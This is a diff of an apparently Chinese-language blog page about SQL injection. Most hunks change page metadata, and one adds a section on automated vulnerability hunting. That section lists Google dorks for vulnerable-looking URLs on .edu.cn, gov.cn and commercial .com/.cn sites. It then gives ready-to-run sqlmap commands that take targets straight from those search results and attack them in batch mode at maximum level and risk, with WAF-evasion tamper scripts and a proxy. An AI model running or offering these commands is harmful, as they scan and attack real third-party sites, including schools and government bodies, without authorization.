@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://i4g5d.github.io/2025/10/23/SQLI/80d2a4ffaa0cb7d7d1db82770ccdf1cf.png">
 <meta property="og:image" content="https://i4g5d.github.io/2025/10/23/SQLI/image-20251024195214666.png">
 <meta property="article:published_time" content="2025-10-23T09:06:43.000Z">
-<meta property="article:modified_time" content="2025-11-14T12:50:51.118Z">
+<meta property="article:modified_time" content="2025-11-16T14:09:27.048Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://i4g5d.github.io/2025/10/23/SQLI/80d2a4ffaa0cb7d7d1db82770ccdf1cf.png">
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.4k 字
+          8.5k 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          62 分钟
+          71 分钟
         
       </span>
     
@@ -541,6 +541,22 @@
 <p><img src="/2025/10/23/SQLI/image-20251024195214666.png" srcset="/img/loading.gif" lazyload></p>
 <p>脚本按照用途命名，比如 space2comment.py 是指，用&#x2F;**&#x2F;代替空格。</p>
 <p>当然，你也可以根据内置脚本格式，自己定义绕过脚本。</p>
+<p>这里有一个利用SQLmap结合Google 语法自动挖洞的方法，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">全面参数覆盖 (PHP, ASP, JSP)<br>site:.edu.cn inurl:php?id= OR inurl:view.php?fid= OR inurl:news.php?cid= OR inurl:article.php?aid= OR inurl:show.php?catid= OR inurl:product.php?pid= OR inurl:item.php?item_id= OR inurl:default.aspx?sid=<br></code></pre></td></tr></table></figure>
+
+<p>针对旧版动态页面 (ASP):</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">site:.edu.cn inurl:.asp?<span class="hljs-built_in">id</span>= OR inurl:.aspx?<span class="hljs-built_in">id</span>= OR inurl:.jsp?<span class="hljs-built_in">id</span>= OR inurl:detail.jsp?<span class="hljs-built_in">id</span>=<br></code></pre></td></tr></table></figure>
+
+<p>针对常见企业&#x2F;商业机构 (.com .cn)</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:news</span>.php?id= OR inur<span class="hljs-variable">l:product</span>.php?id= OR inur<span class="hljs-variable">l:read</span>.php?id= site:.<span class="hljs-keyword">com</span> OR site:.<span class="hljs-keyword">cn</span><br></code></pre></td></tr></table></figure>
+
+<p>带分页&#x2F;排序参数</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">inur<span class="hljs-variable">l:list</span>.php?page= OR inur<span class="hljs-variable">l:search</span>.php?<span class="hljs-keyword">sort</span>= site:gov.<span class="hljs-keyword">cn</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -g &quot;&lt;粘贴上述任一Dork组合&gt;&quot; \<br>--proxy &quot;http://127.0.0.1:7890&quot; \<br>--threads 5 \<br>--level 5 \<br>--risk 3 \<br>--tamper &quot;space2comment,randomcase,charencode&quot; \<br>--random-agent \<br>--timeout 15 \<br>--retries 3 \<br>--answer &quot;extending=N,follow=N,keep=N,exploit=n,waf=Y,cookie=Y&quot;<br>--batch  <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -g &quot;site:.edu.cn inurl:.asp?id= OR inurl:.aspx?id= OR inurl:.jsp?id= OR inurl:detail.jsp?id=&quot;--proxy &quot;http://127.0.0.1:7890&quot; --threads 5 --level 5 --risk 3 --tamper &quot;space2comment,randomcase,charencode&quot; --random-agent --timeout 15 --retries 3 --answer &quot;extending=N,follow=N,keep=N,exploit=n,waf=Y,cookie=Y&quot; --batch  <br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
